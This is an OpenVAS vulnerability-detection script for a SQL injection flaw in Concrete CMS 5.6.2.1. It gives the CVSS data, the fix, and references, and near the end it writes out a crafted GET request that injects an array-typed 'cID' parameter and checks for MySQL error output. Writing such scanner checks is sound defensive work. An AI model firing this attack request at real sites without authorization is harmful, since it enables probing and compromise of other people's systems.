###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_concrete_cms_sql_inj_vuln.nasl 5790 2017-03-30 12:18:42Z cfi $
#
# Concrete CMS SQL Injection Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903511");
  script_version("$Revision: 5790 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-03-30 14:18:42 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2014-02-19 16:18:17 +0530 (Wed, 19 Feb 2014)");
  script_name("Concrete CMS SQL Injection Vulnerability");

  script_tag(name : "summary" , value : "The host is installed with Concrete CMS and is prone to sql injection
  vulnerability");
  script_tag(name : "vuldetect" , value : "Send a crafted exploit string via HTTP GET request and check whether it
  is possible to execute sql query.");
  script_tag(name : "insight" , value : "The flaw is due to improper validation of 'cID' parameter passed to
  '/index.php' script.");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands in applications database and gain complete control over the vulnerable
  web application.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Concrete CMS version 5.6.2.1");
  script_tag(name : "solution" , value : "Upgrade to version 5.6.3 or later,
  For updates refer to https://www.concrete5.org");

  script_xref(name : "URL" , value : "http://1337day.com/exploit/21919");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/31735/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125280/concrete5-sql.txt");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 SecPod");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
conPort = "";
rcvRes = "";
url = "";

conPort = get_http_port(default:80);

if(!can_host_php(port:conPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/concrete", "/cms",  cgi_dirs(port:conPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:conPort);

  ## confirm the Concrete CMS installation
  if('>concrete5' >< rcvRes && 'Welcome to concrete5!' >< rcvRes)
  {
    ## Construct Attack Request
    url = dir + "/index.php/?arHandle=Main&bID=34&btask=passthru&ccm_token=" +
                "1392630914:be0d09755f653afb162d041a33f5feae&cID[$owmz]=1&" +
                "method=submit_form" ;

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:conPort, url:url, pattern:'>mysqlt error:',
     extra_check:make_list('Pages.cID = Array', 'EXECUTE."select Pages.cID')))
    {
      security_message(port:conPort);
      exit(0);
    }
  }
}

exit(99);